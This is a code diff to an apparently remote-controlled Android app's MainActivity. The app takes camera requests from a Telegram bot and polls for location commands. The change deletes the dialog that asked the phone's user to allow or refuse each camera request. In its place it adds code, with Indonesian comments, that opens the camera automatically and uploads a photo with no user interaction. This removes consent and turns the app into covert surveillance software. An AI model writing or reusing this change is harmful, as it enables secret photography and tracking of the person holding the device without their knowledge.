@@ -288,70 +288,35 @@ public class MainActivity
             return;
         }
 
-        String cameraLabel =
-                "front".equals(camera)
-                        ? "Kamera depan"
-                        : "Kamera belakang";
+        // Langsung tandai RECEIVED dan buka CameraActivity tanpa dialog.
+        // CameraActivity akan otomatis mengambil foto dan upload —
+        // tidak ada interaksi manual dari pengguna yang diperlukan.
+        new Thread(
+                () ->
+                        ApiHelper
+                                .updateCameraRequestStatus(
+                                        requestId,
+                                        "RECEIVED"
+                                )
+        ).start();
 
-        new androidx.appcompat.app.AlertDialog
-                .Builder(this)
-                .setTitle(
-                        "Permintaan Kamera"
-                )
-                .setMessage(
-                        cameraLabel
-                                + " diminta melalui bot Telegram.\n\n"
-                                + "Izinkan aplikasi membuka kamera?"
-                )
-                .setNegativeButton(
-                        "Tolak",
-                        (dialog, which) -> {
+        Intent intent =
+                new Intent(
+                        MainActivity.this,
+                        CameraActivity.class
+                );
 
-                            new Thread(
-                                    () ->
-                                            ApiHelper
-                                                    .updateCameraRequestStatus(
-                                                            requestId,
-                                                            "CANCELLED"
-                                                    )
-                            ).start();
-                        }
-                )
-                .setPositiveButton(
-                        "Izinkan",
-                        (dialog, which) -> {
+        intent.putExtra(
+                "requestId",
+                requestId
+        );
 
-                            new Thread(
-                                    () ->
-                                            ApiHelper
-                                                    .updateCameraRequestStatus(
-                                                            requestId,
-                                                            "RECEIVED"
-                                                    )
-                            ).start();
+        intent.putExtra(
+                "camera",
+                camera
+        );
 
-                            Intent intent =
-                                    new Intent(
-                                            MainActivity.this,
-                                            CameraActivity.class
-                                    );
-
-                            intent.putExtra(
-                                    "requestId",
-                                    requestId
-                            );
-
-                            intent.putExtra(
-                                    "camera",
-                                    camera
-                            );
-
-                            startActivity(
-                                    intent
-                            );
-                        }
-                )
-                .show();
+        startActivity(intent);
     }
 
     private void startLocationCommandPolling() {
